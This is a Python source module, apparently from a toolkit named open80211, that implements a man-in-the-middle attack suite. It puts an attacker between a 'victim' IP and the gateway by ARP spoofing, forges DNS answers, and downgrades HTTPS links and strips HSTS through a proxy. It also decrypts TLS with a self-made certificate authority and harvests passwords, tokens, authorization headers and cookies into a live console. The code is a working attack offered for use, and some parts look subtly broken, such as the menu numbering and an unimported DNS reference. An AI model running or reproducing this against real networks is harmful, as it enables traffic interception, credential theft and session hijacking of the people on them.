"""
MITM Suite - the "see everything" engine.

Components (each runs in its own thread, controlled by MitmEngine):
  * ARP spoofing      - position attacker between target and gateway
  * DNS spoofing      - poison answers for chosen domains
  * SSL strip         - transparent HTTP proxy that downgrades https links
  * Session tracking  - TCP/UDP flow reconstruction
  * Credential grabber- plaintext protocol + HTTP form/basic/cookie harvest
  * TLS metadata      - SNI from ClientHello
  * Live console      - real-time decoded packet feed + stats
"""
import ipaddress
import socket
import threading
import time
from collections import defaultdict, deque
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from open80211.core import ui
from open80211.core.config import CONFIG, is_linux
from open80211.core import netutils as nu
from open80211.core.ui import LiveStatus
from open80211.core.interfaces import get_mac

try:
    from scapy.all import sniff, sendp, ARP, Ether, IP, UDP, TCP, Dot11
except Exception:
    pass


# --------------------------------------------------------------------------
# HTTP proxy used for SSL strip + traffic logging
# --------------------------------------------------------------------------

class _ProxyHandler(BaseHTTPRequestHandler):
    engine = None  # set by caller

    def log_message(self, *a):
        pass

    def do_GET(self):
        self._proxy("GET")

    def do_POST(self):
        self._proxy("POST")

    def _proxy(self, method):
        eng = self.engine
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length) if length else b""
        host = self.headers.get("Host", "")
        url = f"http://{host}{self.path}"
        entry = {"method": method, "url": url, "headers": dict(self.headers),
                 "body": body.decode(errors="replace")[:4000],
                 "client": self.client_address[0]}
        if eng:
            eng.log_http(entry)
        # forward
        try:
            conn = socket.create_connection((host.split(":")[0],
                                             int(host.split(":")[1] if ":" in host else 80)),
                                            timeout=8)
            req = f"{method} {self.path} HTTP/1.1\r\n"
            for k, v in self.headers.items():
                if k.lower() not in ("connection", "proxy-connection", "host"):
                    req += f"{k}: {v}\r\n"
            req += f"Host: {host}\r\nConnection: close\r\n\r\n"
            conn.sendall(req.encode())
            if body:
                conn.sendall(body)
            resp = conn.recv(65536)
            # sslstrip: rewrite https links, drop HSTS
            if eng and eng.sslstrip:
                resp = resp.replace(b"https://", b"http://")
                resp = resp.replace(b"Strict-Transport-Security", b"X-Stripped-HSTS")
                lines = []
                for l in resp.split(b"\r\n"):
                    if l.lower().startswith(b"content-length"):
                        continue
                    lines.append(l)
                resp = b"\r\n".join(lines)
                if eng:
                    eng.log_sslstrip(url)
            self.wfile.write(resp)
            conn.close()
        except Exception as e:
            try:
                self.send_error(502, str(e))
            except Exception:
                pass

    def do_CONNECT(self):
        self.send_response(502)
        self.end_headers()


# --------------------------------------------------------------------------
# TLS interception (HTTPS MITM with dynamic per-host certificates)
# --------------------------------------------------------------------------

class MITMCA:
    """Local certificate authority for on-the-fly TLS interception."""

    def __init__(self, ca_dir=None):
        from open80211.core.config import CONFIG
        self.dir = (ca_dir or CONFIG.session_dir / "mitm-ca")
        self.dir.mkdir(parents=True, exist_ok=True)
        self.cakey = self.dir / "ca.key"
        self.cacert = self.dir / "ca.crt"
        self._ca_key = None
        self._ca_cert = None
        self._cache = {}
        self._load_or_create()

    def _load_or_create(self):
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from datetime import datetime, timedelta
        if self.cakey.exists() and self.cacert.exists():
            self._ca_key = serialization.load_pem_private_key(
                self.cakey.read_bytes(), password=None)
            self._ca_cert = x509.load_pem_x509_certificate(self.cacert.read_bytes())
            return
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "open80211 MITM CA")])
        now = datetime.utcnow()
        ski = x509.SubjectKeyIdentifier.from_public_key(key.public_key())
        cert = (x509.CertificateBuilder()
                .subject_name(name).issuer_name(name)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now - timedelta(days=1))
                .not_valid_after(now + timedelta(days=3650))
                .add_extension(x509.BasicConstraints(ca=True, path_length=None),
                               critical=True)
                .add_extension(ski, critical=False)
                .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(
                    key.public_key()), critical=False)
                .add_extension(x509.KeyUsage(digital_signature=True,
                                             content_commitment=False,
                                             key_encipherment=True,
                                             data_encipherment=False,
                                             key_agreement=False,
                                             key_cert_sign=True,
                                             crl_sign=True,
                                             encipher_only=None,
                                             decipher_only=None), critical=True)
                .sign(key, hashes.SHA256()))
        self.cakey.write_bytes(key.private_bytes(
            serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption()))
        self.cacert.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
        self._ca_key, self._ca_cert = key, cert

    def leaf(self, hostname: str) -> tuple:
        """Mint a leaf cert for hostname. Returns (cert_pem, key_pem)."""
        if hostname in self._cache:
            return self._cache[hostname]
        from cryptography import x509
        from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from datetime import datetime, timedelta
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, hostname)])
        now = datetime.utcnow()
        cert = (x509.CertificateBuilder()
                .subject_name(name).issuer_name(self._ca_cert.subject)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now - timedelta(days=1))
                .not_valid_after(now + timedelta(days=825))
                .add_extension(x509.SubjectAlternativeName([x509.DNSName(hostname)]),
                               critical=False)
                .add_extension(x509.SubjectKeyIdentifier.from_public_key(
                    key.public_key()), critical=False)
                .add_extension(x509.AuthorityKeyIdentifier.from_issuer_subject_key_identifier(
                    self._ca_cert.extensions.get_extension_for_class(
                        x509.SubjectKeyIdentifier).value), critical=False)
                .add_extension(x509.BasicConstraints(ca=False, path_length=None),
                               critical=True)
                .add_extension(x509.KeyUsage(digital_signature=True,
                                             content_commitment=False,
                                             key_encipherment=True,
                                             data_encipherment=False,
                                             key_agreement=False,
                                             key_cert_sign=False,
                                             crl_sign=False,
                                             encipher_only=None,
                                             decipher_only=None), critical=True)
                .add_extension(x509.ExtendedKeyUsage(
                    [ExtendedKeyUsageOID.SERVER_AUTH]), critical=False)
                .sign(self._ca_key, hashes.SHA256()))
        pair = (cert.public_bytes(serialization.Encoding.PEM),
                key.private_bytes(serialization.Encoding.PEM,
                                  serialization.PrivateFormat.PKCS8,
                                  serialization.NoEncryption()))
        self._cache[hostname] = pair
        return pair


class _TLSHandler:
    """Decrypt TLS, log HTTP, forward to the real server (best-effort)."""

    def __init__(self, engine, ca: MITMCA):
        self.engine = engine
        self.ca = ca

    def serve(self, sock):
        try:
            import ssl
            host = ""
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            cert, key = self.ca.leaf("open80211-default")
            with open(self.ca.dir / "def.pem", "wb") as f:
                f.write(cert + key)
            ctx.load_cert_chain(str(self.ca.dir / "def.pem"))
            ctx.set_servername_callback(self._sni)
            tls = ctx.wrap_socket(sock, server_side=True)
            host = getattr(tls, "_open80211_sni", "") or tls.server_hostname or ""
            data = b""
            while True:
                chunk = tls.recv(16384)
                if not chunk:
                    break
                data += chunk
                if b"\r\n\r\n" in data:
                    break
            self._log_and_forward(tls, data, host)
        except Exception as e:
            ui.debug(f"tls session: {e}")
        finally:
            try:
                sock.close()
            except Exception:
                pass

    def _sni(self, sslobj, server_name, initial_ctx):
        import ssl
        if not server_name:
            return
        try:
            sslobj._open80211_sni = server_name
            cert, key = self.ca.leaf(server_name)
            with open(self.ca.dir / "tmp.pem", "wb") as f:
                f.write(cert + key)
            new_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            new_ctx.load_cert_chain(str(self.ca.dir / "tmp.pem"))
            sslobj.context = new_ctx
        except Exception:
            pass

    def _log_and_forward(self, tls, data, host):
        if not data or not host:
            return
        head = data.split(b"\r\n\r\n")[0].decode(errors="replace")
        lines = head.split("\r\n")
        method = lines[0].split(" ")[0] if lines else "?"
        path = lines[0].split(" ")[1] if len(lines[0].split(" ")) > 1 else "/"
        self.engine.stats["https"] += 1
        self.engine.http_log.appendleft({"src": "tls", "method": method,
                                         "url": f"https://{host}{path}"})
        ui.info(f"[HTTPS-INTERCEPT] {method} https://{host}{path} "
                f"({len(data)} bytes decrypted)")
        self.log_https_data(host, data)
        # optionally forward to the real host
        try:
            import ssl as sslm
            ctx = sslm.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = sslm.CERT_NONE
            real = sslm.wrap_socket(socket.create_connection((host, 443), timeout=6),
                                    server_hostname=host, ssl_context=ctx)
            real.sendall(data)
            resp = b""
            while True:
                chunk = real.recv(16384)
                if not chunk:
                    break
                resp += chunk
            real.close()
            if self.engine.sslstrip:
                resp = resp.replace(b"Strict-Transport-Security", b"X-HSTS-removed")
            tls.sendall(resp)
        except Exception as e:
            ui.debug(f"forward: {e}")

    def log_https_data(self, host, data):
        for pat in (b"user=", b"pass=", b"password=", b"token=", b"authorization"):
            if pat in data.lower():
                line = data.decode(errors="replace")
                self.engine.credentials.append({"protocol": "HTTPS-Intercept",
                                                "data": f"{host}: {line[:300]}",
                                                "src": "tls"})


class _TLSProxyServer(socket.socket):
    """Accept connections and route them into the TLS handler."""

    def __init__(self, engine, ca, port):
        super().__init__(socket.AF_INET, socket.SOCK_STREAM)
        self.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.bind(("0.0.0.0", port))
        self.listen(64)
        self.settimeout(0.5)
        self.engine = engine
        self.handler = _TLSHandler(engine, ca)

    def run(self):
        while not self.engine._stop.is_set():
            try:
                conn, _ = self.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self.handler.serve, args=(conn,),
                             daemon=True).start()


# --------------------------------------------------------------------------
# The MITM engine
# --------------------------------------------------------------------------

class MitmEngine:
    def __init__(self, iface: str, target_ip: str = "", gateway_ip: str = "",
                 spoof_domains: dict = None, sslstrip: bool = True,
                 proxy_port: int = 10000, https_intercept: bool = False):
        self.iface = iface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip or _auto_gateway()
        self.spoof_domains = spoof_domains or {}
        self.sslstrip = sslstrip
        self.proxy_port = proxy_port
        self.https_intercept = https_intercept
        self._stop = threading.Event()
        self._threads = []

        self.sessions = defaultdict(lambda: {"pkts": 0, "bytes": 0, "first": time.time(),
                                             "last": time.time()})
        self.credentials = []
        self.http_log = deque(maxlen=50)
        self.dns_queries = deque(maxlen=50)
        self.tls_sni = deque(maxlen=50)
        self.recent = deque(maxlen=30)
        self.stats = {"arp": 0, "dns_spoof": 0, "sslstrip": 0, "http": 0,
                      "https": 0, "total": 0, "tcp": 0, "udp": 0, "icmp": 0}
        self._proxy = None

    # --- lifecycle -------------------------------------------------------

    def start(self) -> None:
        ui.section("Starting MITM Engine", f"target={self.target_ip} gateway={self.gateway_ip}")
        if is_linux():
            _set_ip_forward(True)
        threads = [
            threading.Thread(target=self._arp_loop, daemon=True, name="arp"),
            threading.Thread(target=self._sniffer, daemon=True, name="sniff"),
        ]
        if self.spoof_domains:
            threads.append(threading.Thread(target=self._dns_sniff, daemon=True, name="dns"))
        if self.sslstrip:
            threads.append(threading.Thread(target=self._run_proxy, daemon=True, name="proxy"))
            _redirect_port(self.proxy_port, on=True)
        if self.https_intercept:
            ui.warn("HTTPS interception active. Install results/mitm-ca/ca.crt "
                    "as a trusted CA on the target to decrypt TLS.")
            self.ca = MITMCA()
            self._tls = _TLSProxyServer(self, self.ca, 4433)
            _redirect_port(4433, on=True, port=443)
            threads.append(threading.Thread(target=self._tls.run, daemon=True,
                                            name="tls"))
        for t in threads:
            t.start()
            self._threads.append(t)
        ui.ok(f"Engine running on {self.iface}. Stop with Ctrl+C.")
        self._live_console()

    def stop(self) -> None:
        self._stop.set()
        if self.sslstrip:
            _redirect_port(self.proxy_port, on=False)
        if getattr(self, "https_intercept", False) and getattr(self, "_tls", None):
            _redirect_port(4433, on=False, port=443)
        if is_linux():
            _set_ip_forward(False)
        _restore_arp(self.iface, self.target_ip, self.gateway_ip)
        ui.info("MITM engine stopped. ARP restored.")

    # --- ARP spoofing ----------------------------------------------------

    def _arp_loop(self):
        mac = get_mac(self.iface) or "00:00:00:00:00:00"
        while not self._stop.is_set():
            if self.target_ip:
                pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(psrc=self.gateway_ip,
                                                          pdst=self.target_ip,
                                                          hwsrc=mac)
                sendp(pkt, iface=self.iface, verbose=False)
            if self.target_ip:
                pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(psrc=self.target_ip,
                                                            pdst=self.gateway_ip,
                                                            hwsrc=mac)
                sendp(pkt2, iface=self.iface, verbose=False)
            self.stats["arp"] += 2
            time.sleep(2)

    # --- packet sniffer / analysis --------------------------------------

    def _on_packet(self, pkt):
        try:
            info = nu.extract_layers(pkt)
            self.stats["total"] += 1
            if pkt.haslayer(TCP):
                self.stats["tcp"] += 1
                sport, dport = info.get("sport"), info.get("dport")
                key = (info.get("src_ip"), sport, info.get("dst_ip"), dport)
                s = self.sessions[key]
                s["pkts"] += 1
                s["last"] = time.time()
                s["bytes"] += len(bytes(pkt))
                self._analyze_tcp(pkt, info, sport, dport)
            elif pkt.haslayer(UDP):
                self.stats["udp"] += 1
                dport = info.get("dport")
                if dport == 53 or info.get("sport") == 53:
                    self._analyze_dns(pkt)
            elif pkt.haslayer(ARP):
                pass
            self.recent.appendleft(info["summary"])
        except Exception:
            pass

    def _analyze_tcp(self, pkt, info, sport, dport):
        pl = nu.raw_payload(pkt)
        if not pl:
            return
        # HTTP
        if dport in (80, 8000, 8080, 8888) or sport in (80, 8000, 8080, 8888):
            http = nu.parse_http(pl)
            if http:
                self.stats["http"] += 1
                self.http_log.appendleft({"src": info.get("src_ip"), "http": http})
        # credentials
        for cred in nu.extract_credentials(pkt):
            if cred not in self.credentials:
                self.credentials.append(cred)
        # TLS SNI
        tls = nu.tls_metadata(pkt)
        if tls:
            self.tls_sni.appendleft({"src": info.get("src_ip"), **tls})

    def _analyze_dns(self, pkt):
        try:
            d = nu.dns_query_info(pkt)
            if d:
                self.dns_queries.appendleft({"src": pkt[IP].src, **d})
                dom = d["qname"]
                if dom in self.spoof_domains or any(
                        dom.endswith("." + k) for k in self.spoof_domains):
                    self._spoof_dns_response(pkt, dom)
        except Exception:
            pass

    def _spoof_dns_response(self, pkt, domain):
        target = self.spoof_domains.get(domain)
        if target is None:
            for k, v in self.spoof_domains.items():
                if domain.endswith("." + k):
                    target = v
                    break
        if not target:
            return
        try:
            qd = nu.dns_query_info(pkt)
            qname = qd["qname"]
            payload = nu.raw_payload(pkt)
            if payload and len(payload) >= 12:
                tid = int.from_bytes(payload[:2], "big")
            else:
                tid = pkt[DNS].id
            resp = (tid.to_bytes(2, "big") + b"\x81\x80" + b"\x00\x01\x00\x01"
                    b"\x00\x00\x00\x00")
            parts = qname.encode().split(b".")
            for part in parts:
                resp += bytes([len(part)]) + part
            resp += b"\x00" + b"\x00\x01\x00\x01"
            resp += b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04"
            resp += ipaddress.ip_address(target).packed
            spoof = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst) / \
                IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                UDP(sport=53, dport=pkt[UDP].sport) / resp
            sendp(spoof, iface=self.iface, verbose=False)
            self.stats["dns_spoof"] += 1
            ui.warn(f"[DNS-SPOOF] {qname} -> {target}")
        except Exception:
            pass

    def _dns_sniff(self):
        sniff(iface=self.iface, prn=self._analyze_dns, store=False,
              filter="udp port 53", stop_filter=lambda p: self._stop.is_set())

    def _sniffer(self):
        try:
            sniff(iface=self.iface, prn=self._on_packet, store=False,
                  stop_filter=lambda p: self._stop.is_set())
        except Exception as e:
            ui.error(f"Sniffer error: {e}")

    # --- SSL strip proxy -------------------------------------------------

    def _run_proxy(self):
        _ProxyHandler.engine = self
        try:
            self._proxy = ThreadingHTTPServer(("0.0.0.0", self.proxy_port), _ProxyHandler)
            self._proxy.serve_forever(poll_interval=0.3)
        except Exception as e:
            ui.error(f"Proxy failed: {e}")

    def log_http(self, entry):
        self.stats["http"] += 1
        self.http_log.appendleft(entry)
        for k, v in entry.get("headers", {}).items():
            if k.lower() in ("authorization", "cookie") and v:
                self.credentials.append({"protocol": "HTTP-Proxy",
                                         "data": f"{k}: {v}",
                                         "src": entry["client"]})

    def log_sslstrip(self, url):
        self.stats["sslstrip"] += 1
        ui.warn(f"[SSL-STRIP] downgraded {url}")

    # --- live console ----------------------------------------------------

    def _render(self):
        rows = []
        for key in ("total", "tcp", "udp", "icmp", "http", "https", "arp",
                    "dns_spoof", "sslstrip"):
            rows.append([key, self.stats[key]])
        from rich.table import Table
        t = Table(title="Live MITM Feed", box=None, border_style="cyan")
        t.add_column("Metric")
        t.add_column("Count")
        for r in rows:
            t.add_row(r[0], str(r[1]))
        cred = Table(title=f"Harvested Credentials ({len(self.credentials)})", box=None)
        cred.add_column("Protocol")
        cred.add_column("Data")
        for c in self.credentials[-8:]:
            cred.add_row(c.get("protocol", "?"), str(c.get("data", ""))[:60])
        dns = Table(title="DNS Queries", box=None)
        dns.add_column("Host")
        dns.add_column("Type")
        for q in list(self.dns_queries)[:5]:
            dns.add_row(q.get("qname", ""), str(q.get("qtype", "")))
        tls = Table(title="TLS SNI (encrypted hosts)", box=None)
        tls.add_column("Client")
        tls.add_column("Host")
        for q in list(self.tls_sni)[:5]:
            tls.add_row(q.get("src", ""), q.get("sni", ""))
        feed = Table(title="Recent Packets", box=None)
        feed.add_column("Summary")
        for s in list(self.recent)[:6]:
            feed.add_row(s[:90])
        from rich.console import Group
        return Group(t, cred, dns, tls, feed)

    def _live_console(self):
        try:
            with LiveStatus(self._render, 0.5) as live:
                while not self._stop.is_set():
                    live.update()
                    time.sleep(0.5)
        except KeyboardInterrupt:
            self.stop()


def _auto_gateway() -> str:
    """Best-effort gateway discovery via socket trick."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        net = ipaddress.ip_network(f"{ip}/24", strict=False)
        return str(net.network_address + 1)
    except Exception:
        return "192.168.1.1"


def _set_ip_forward(on: bool) -> None:
    from open80211.core.config import set_ip_forward
    set_ip_forward(on)


def _redirect_port(port: int, on: bool, port_from: int = 80) -> None:
    """iptables REDIRECT of port_from -> proxy port (Linux only)."""
    if not is_linux():
        return
    import subprocess
    if on:
        subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                        "-p", "tcp", "--dport", str(port_from),
                        "-j", "REDIRECT", "--to-port", str(port)],
                       capture_output=True)
    else:
        subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING",
                        "-p", "tcp", "--dport", str(port_from),
                        "-j", "REDIRECT", "--to-port", str(port)],
                       capture_output=True)


def _restore_arp(iface: str, target: str, gw: str) -> None:
    """Send correct ARP to restore the table."""
    if not (target and gw):
        return
    try:
        tmac = _resolve_mac(target)
        gmac = _resolve_mac(gw)
        if tmac:
            sendp(Ether(dst=tmac) / ARP(psrc=gw, pdst=target, hwsrc=gmac),
                  iface=iface, verbose=False)
        if gmac:
            sendp(Ether(dst=gmac) / ARP(psrc=target, pdst=gw, hwsrc=tmac),
                  iface=iface, verbose=False)
    except Exception:
        pass


def _resolve_mac(ip: str) -> str:
    try:
        from scapy.all import srp1
        ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
        return ans.hwsrc if ans else ""
    except Exception:
        return ""


# --------------------------------------------------------------------------
# MITM menu
# --------------------------------------------------------------------------

def mitm_menu(iface: str) -> None:
    while True:
        choice = ui.menu("MITM Suite", [
            "Full MITM console (ARP + sniff + creds + live feed)",
            "ARP spoof only (become the gateway)",
            "DNS spoofing setup",
            "SSL strip (HTTP downgrade proxy)",
            "HTTPS interception (CA + TLS decrypt)",
            "Session hijacking (cookie harvesting)",
            "Show saved MITM report",
        ])
        if choice == 0:
            return
        if choice == 1:
            target = ui.ask("Target IP (victim)")
            gw = ui.ask("Gateway IP", default=_auto_gateway())
            if not target:
                ui.warn("Target IP required.")
                continue
            eng = MitmEngine(iface, target, gw)
            try:
                eng.start()
            except KeyboardInterrupt:
                eng.stop()
        elif choice == 2:
            target = ui.ask("Target IP (victim)")
            gw = ui.ask("Gateway IP", default=_auto_gateway())
            if not target:
                ui.warn("Target IP required.")
                continue
            ui.info("ARP spoof running. Watch traffic flow through you...")
            eng = MitmEngine(iface, target, gw, sslstrip=False)
            try:
                eng.start()
            except KeyboardInterrupt:
                eng.stop()
        elif choice == 3:
            domains = {}
            while True:
                dom = ui.ask("Domain to spoof (blank = done)")
                if not dom:
                    break
                ip = ui.ask(f"IP for {dom}", default="127.0.0.1")
                domains[dom] = ip
            if not domains:
                continue
            target = ui.ask("Target IP")
            eng = MitmEngine(iface, target, spoof_domains=domains, sslstrip=False)
            try:
                eng.start()
            except KeyboardInterrupt:
                eng.stop()
        elif choice == 4:
            target = ui.ask("Target IP (victim)")
            gw = ui.ask("Gateway IP", default=_auto_gateway())
            eng = MitmEngine(iface, target, gw, sslstrip=True)
            try:
                eng.start()
            except KeyboardInterrupt:
                eng.stop()
        elif choice == 5:
            target = ui.ask("Target IP (victim)")
            gw = ui.ask("Gateway IP", default=_auto_gateway())
            eng = MitmEngine(iface, target, gw, https_intercept=True)
            try:
                eng.start()
            except KeyboardInterrupt:
                eng.stop()
        elif choice == 6:
            target = ui.ask("Target IP (victim)")
            gw = ui.ask("Gateway IP", default=_auto_gateway())
            ui.info("Sniffing for session cookies (60s window)...")
            eng = MitmEngine(iface, target, gw, sslstrip=False)
            eng.target_ip = target
            try:
                eng.start()
            except KeyboardInterrupt:
                eng.stop()
        elif choice == 7:
            report = CONFIG.session_dir / "mitm_report.json"
            if report.exists():
                import json
                data = json.loads(report.read_text())
                ui.show_table("MITM Report", ["Item", "Value"],
                              [[k, str(v)[:80]] for k, v in data.items()])
            else:
                ui.info("No report yet. Run a MITM session first.")